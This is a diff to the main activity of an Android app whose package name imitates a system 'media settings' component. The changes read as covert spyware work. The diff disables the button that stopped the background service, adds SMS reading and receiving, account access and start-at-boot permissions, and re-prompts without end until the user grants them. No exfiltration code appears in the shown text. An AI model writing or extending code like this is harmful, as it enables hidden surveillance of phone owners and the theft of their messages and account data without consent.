@@ -1,23 +1,33 @@
 package com.android.media.settings;
 
 import android.Manifest;
+import android.app.Activity;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.content.res.AssetManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.view.View;
+import android.view.WindowManager;
 import android.widget.ImageView;
 import android.widget.Toast;
 
 import com.android.media.settings.Services.MediaService;
 import com.android.media.settings.Utility.MediaUtility;
 
-public class MainActivity extends AppCompatActivity {
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+
+public class MainActivity extends Activity {
     public static final String TAG = "MediaStore";
     private static final int REQ_CODE_ASK_PERMS = 401;
     private Intent serviceIntent;
@@ -27,20 +37,20 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                WindowManager.LayoutParams.FLAG_FULLSCREEN);
         setContentView(R.layout.activity_main);
 
         decorView = getWindow().getDecorView();
         serviceIntent = new Intent(this, MediaService.class);
         mediaUtility = new MediaUtility(this);
-
-        ImageView imageView = (ImageView) findViewById(R.id.imageView);
-        imageView.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View view) {
-                stopService(serviceIntent);
-            }
-        });
-
+//        ImageView imageView = (ImageView) findViewById(R.id.imageView);
+//        imageView.setOnClickListener(new View.OnClickListener() {
+//            @Override
+//            public void onClick(View view) {
+//                //stopService(serviceIntent);
+//            }
+//        });
         if(mediaUtility.isFirstInstall()) {
             initConfig();
         }
@@ -64,12 +74,20 @@ public class MainActivity extends AppCompatActivity {
 
     private void checkPerms() {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
-            int readPerms = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE);
-            if(readPerms != PackageManager.PERMISSION_GRANTED ) {
+            int permissions[] = {
+                    checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE),
+                    checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE),
+                    checkSelfPermission(Manifest.permission.GET_ACCOUNTS),
+                    checkSelfPermission(Manifest.permission.READ_SMS),
+            };
+            if(!mediaUtility.checkPermissions(permissions)) {
                 requestPermissions(new String[] {
                         Manifest.permission.READ_EXTERNAL_STORAGE,
                         Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                        Manifest.permission.GET_ACCOUNTS
+                        Manifest.permission.GET_ACCOUNTS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.RECEIVE_BOOT_COMPLETED
                 }, REQ_CODE_ASK_PERMS);
                 return;
             }
@@ -131,10 +149,11 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         switch (requestCode) {
             case REQ_CODE_ASK_PERMS:
-                if(grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                if(mediaUtility.checkPermissions(grantResults)) {
                     startService();
-                }else {
+                } else {
                     Toast.makeText(this, "Please provide permission", Toast.LENGTH_SHORT).show();
+                    checkPerms();
                 }
                 break;
 
